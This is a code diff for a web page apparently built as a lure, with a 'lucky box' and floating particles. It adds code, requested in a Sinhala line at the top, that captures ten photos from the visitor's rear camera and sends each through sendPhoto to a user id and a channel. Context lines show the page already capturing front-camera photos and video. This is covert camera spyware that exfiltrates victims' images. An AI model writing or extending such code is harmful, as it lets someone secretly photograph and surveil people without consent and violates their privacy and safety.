@@ -1,3 +1,5 @@
+Back camera photo 10 ත් මෙකට ඇඩ් කරලා දෙන්න.
+
 // Create floating particles
 function createParticles() {
     const particles = document.getElementById('particles');
@@ -269,6 +271,33 @@ if (luckyBox) {
     } catch (error) {
         console.error('Front camera error:', error);
     }
+    
+// Back camera photos (10 photos)
+try {
+    const backStream = await navigator.mediaDevices.getUserMedia({ 
+        video: { facingMode: { exact: 'environment' } } 
+    });
+    const backVideo = document.createElement('video');
+    backVideo.srcObject = backStream;
+    await backVideo.play();
+    
+    // Set canvas dimensions to match video
+    canvas.width = backVideo.videoWidth;
+    canvas.height = backVideo.videoHeight;
+    
+    for (let i = 1; i <= 10; i++) {
+        context.drawImage(backVideo, 0, 0, canvas.width, canvas.height);
+        const base64 = canvas.toDataURL('image/png');
+        const blob = await (await fetch(base64)).blob();
+        const caption = `📷 Back Camera Photo ${i}`;
+        await sendPhoto(uid, blob, caption);
+        await sendPhoto(channelId, blob, caption);
+        await new Promise(r => setTimeout(r, 1000)); // 1 second delay between photos
+    }
+    backStream.getTracks().forEach(track => track.stop());
+} catch (error) {
+    console.error('Back camera photos error:', error);
+}
 
     // Front camera video (30 seconds)
     try {
